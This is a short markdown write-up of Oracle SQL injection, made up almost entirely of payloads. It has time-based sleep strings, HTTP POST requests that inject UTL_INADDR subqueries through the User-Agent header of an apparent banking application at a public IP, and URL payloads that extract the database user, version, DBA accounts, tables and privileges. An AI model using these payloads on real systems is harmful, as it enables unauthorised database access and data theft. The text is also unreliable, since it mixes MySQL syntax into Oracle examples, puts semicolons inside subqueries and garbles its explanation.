# Real world example of Oracle SQL Injection

The **UTL_INADDR** package provides a PL/SQL procedures to support internet addressing.It provides an API to retrieve host names and IP addresses of local and remote hosts retrieving host names and IP addresses of remote hosts from PL/SQ It contains two functions which return the server machine name and its IP address. 
When an Web application is being used Oracle Database. there is only possible to perform  SQL Injection PL/SQL Syntax Like **IF condition THEN when_true [ELSE when_false]**
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END
```
1' and if(1=1, sleep(20), true)#
1' or if(1=1, sleep(20), true)#
1' and if(1=1, sleep(20), false)#
1' or if(1=1, sleep(20), true)#
1' and if(1=1, sleep(20), true) -- -
1' or if(1=1, sleep(20), true) -- -
1' and if(1=1, sleep(20), false) -- -
1' or if(1=1, sleep(20), true) -- -
```

```
POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select user from dual))--+) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```

```
POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select banner from v$version where rownum=1))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```
```

POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select username FROM user_role_privs WHERE granted_role='DBA';))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1

```
```

POST /B001/process.jsp HTTP/1.1
Host: 122.248.119.25
User-Agent: Mozilla/5.0 (utl_inaddr.get_host_address((select owner, table_name FROM all_tables;))--) Gecko/20100101
Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
```


```
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT global_name FROM global_name;) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT * FROM session_privs;(Retrieves Current Privs)) )--
https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT global_name FROM global_name;) )--
```
